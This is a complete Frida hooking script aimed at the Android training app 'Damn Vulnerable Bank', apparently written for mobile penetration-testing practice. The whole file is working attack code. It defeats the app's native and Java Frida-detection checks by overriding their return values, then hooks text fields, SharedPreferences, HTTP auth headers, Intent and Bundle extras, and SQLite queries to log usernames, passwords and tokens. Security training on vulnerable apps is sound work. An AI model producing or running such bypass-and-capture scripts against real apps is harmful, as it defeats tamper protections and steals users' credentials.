Java.perform(function() {
    console.log("[*] Starting authentication data capture script...");
    
    // First, bypass native Frida detection
    var nativeLib = Module.findExportByName("libfrida-check.so", "Java_com_app_damnvulnerablebank_FridaCheckJNI_fridaCheck");
    if (nativeLib) {
        console.log("[*] Found Frida detection function, bypassing...");
        Interceptor.attach(nativeLib, {
            onEnter: function(args) {
                console.log("[*] Native Frida check called - bypassing");
            },
            onLeave: function(retval) {
                console.log("[*] Original return value: " + retval);
                retval.replace(0); // Return 0 to indicate no Frida detected
                console.log("[*] Modified return value: " + retval);
            }
        });
    }
    
    // Hook Java-level Frida check as well
    try {
        var FridaCheckJNI = Java.use("com.app.damnvulnerablebank.FridaCheckJNI");
        FridaCheckJNI.fridaCheck.implementation = function() {
            console.log("[*] Java Frida check bypassed");
            return 0;
        };
    } catch (e) {
        console.log("[-] Could not hook Java Frida check: " + e);
    }
    
    // Hook EditText to capture username/password input
    try {
        var EditText = Java.use("android.widget.EditText");
        EditText.getText.implementation = function() {
            var result = this.getText();
            var hint = "";
            try {
                hint = this.getHint();
                if (hint) hint = hint.toString();
            } catch (e) {}
            
            if (result && result.toString().length > 0) {
                console.log("[*] EditText content captured:");
                console.log("    Hint: " + hint);
                console.log("    Text: " + result.toString());
            }
            return result;
        };
    } catch (e) {
        console.log("[-] Could not hook EditText: " + e);
    }
    
    // Hook SharedPreferences to capture stored credentials
    try {
        var SharedPrefsImpl = Java.use("android.app.SharedPreferencesImpl");
        var EditorImpl = Java.use("android.app.SharedPreferencesImpl$EditorImpl");
        
        EditorImpl.putString.implementation = function(key, value) {
            console.log("[*] SharedPreferences putString:");
            console.log("    Key: " + key);
            console.log("    Value: " + value);
            return this.putString(key, value);
        };
        
        SharedPrefsImpl.getString.implementation = function(key, defValue) {
            var result = this.getString(key, defValue);
            if (result && result !== defValue) {
                console.log("[*] SharedPreferences getString:");
                console.log("    Key: " + key);
                console.log("    Value: " + result);
            }
            return result;
        };
    } catch (e) {
        console.log("[-] Could not hook SharedPreferences: " + e);
    }
    
    // Hook HTTP requests to capture authentication data
    try {
        var URL = Java.use("java.net.URL");
        var HttpURLConnection = Java.use("java.net.HttpURLConnection");
        
        HttpURLConnection.setRequestProperty.implementation = function(key, value) {
            if (key.toLowerCase().includes("auth") || key.toLowerCase().includes("token")) {
                console.log("[*] HTTP Authentication header:");
                console.log("    " + key + ": " + value);
            }
            return this.setRequestProperty(key, value);
        };
        
        HttpURLConnection.getOutputStream.implementation = function() {
            var stream = this.getOutputStream();
            console.log("[*] HTTP request to: " + this.getURL());
            return stream;
        };
    } catch (e) {
        console.log("[-] Could not hook HTTP connections: " + e);
    }
    
    // Hook Intent extras for authentication data
    try {
        var Intent = Java.use("android.content.Intent");
        
        Intent.putExtra.overload('java.lang.String', 'java.lang.String').implementation = function(key, value) {
            if (key.toLowerCase().includes("user") || key.toLowerCase().includes("pass") || 
                key.toLowerCase().includes("auth") || key.toLowerCase().includes("login")) {
                console.log("[*] Intent extra (auth-related):");
                console.log("    Key: " + key);
                console.log("    Value: " + value);
            }
            return this.putExtra(key, value);
        };
        
        Intent.getStringExtra.implementation = function(key) {
            var result = this.getStringExtra(key);
            if (result && (key.toLowerCase().includes("user") || key.toLowerCase().includes("pass") || 
                         key.toLowerCase().includes("auth") || key.toLowerCase().includes("login"))) {
                console.log("[*] Intent getStringExtra (auth-related):");
                console.log("    Key: " + key);
                console.log("    Value: " + result);
            }
            return result;
        };
    } catch (e) {
        console.log("[-] Could not hook Intent: " + e);
    }
    
    // Hook Bundle for authentication data
    try {
        var Bundle = Java.use("android.os.Bundle");
        
        Bundle.putString.implementation = function(key, value) {
            if (key && value && (key.toLowerCase().includes("user") || key.toLowerCase().includes("pass") || 
                               key.toLowerCase().includes("auth") || key.toLowerCase().includes("login"))) {
                console.log("[*] Bundle putString (auth-related):");
                console.log("    Key: " + key);
                console.log("    Value: " + value);
            }
            return this.putString(key, value);
        };
        
        Bundle.getString.implementation = function(key) {
            var result = this.getString(key);
            if (result && key && (key.toLowerCase().includes("user") || key.toLowerCase().includes("pass") || 
                                key.toLowerCase().includes("auth") || key.toLowerCase().includes("login"))) {
                console.log("[*] Bundle getString (auth-related):");
                console.log("    Key: " + key);
                console.log("    Value: " + result);
            }
            return result;
        };
    } catch (e) {
        console.log("[-] Could not hook Bundle: " + e);
    }
    
    // Hook SQLite database operations for stored credentials
    try {
        var SQLiteDatabase = Java.use("android.database.sqlite.SQLiteDatabase");
        
        SQLiteDatabase.execSQL.overload('java.lang.String').implementation = function(sql) {
            if (sql.toLowerCase().includes("user") || sql.toLowerCase().includes("pass") || 
                sql.toLowerCase().includes("auth") || sql.toLowerCase().includes("login")) {
                console.log("[*] SQLite execSQL (auth-related):");
                console.log("    SQL: " + sql);
            }
            return this.execSQL(sql);
        };
        
        SQLiteDatabase.rawQuery.implementation = function(sql, selectionArgs) {
            if (sql.toLowerCase().includes("user") || sql.toLowerCase().includes("pass") || 
                sql.toLowerCase().includes("auth") || sql.toLowerCase().includes("login")) {
                console.log("[*] SQLite rawQuery (auth-related):");
                console.log("    SQL: " + sql);
                if (selectionArgs) {
                    console.log("    Args: " + selectionArgs.toString());
                }
            }
            return this.rawQuery(sql, selectionArgs);
        };
    } catch (e) {
        console.log("[-] Could not hook SQLiteDatabase: " + e);
    }
    
    // Hook app-specific classes for authentication
    try {
        var MainActivity = Java.use("com.app.damnvulnerablebank.MainActivity");
        MainActivity.loginPage.implementation = function(view) {
            console.log("[*] Login page accessed");
            return this.loginPage(view);
        };
    } catch (e) {
        console.log("[-] Could not hook MainActivity.loginPage: " + e);
    }
    
    console.log("[*] Authentication data capture script loaded successfully");
});